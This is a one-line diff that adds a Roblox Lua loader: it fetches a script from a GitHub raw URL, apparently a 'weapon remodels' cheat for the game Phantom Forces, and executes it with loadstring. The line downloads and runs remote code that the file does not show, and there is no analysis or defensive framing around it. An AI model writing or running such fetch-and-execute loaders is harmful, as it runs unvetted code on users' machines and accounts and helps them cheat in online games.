@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/fall-weapon-remodels-phantom-forces-spam7-jvl22722i9lgzp.lua"))()
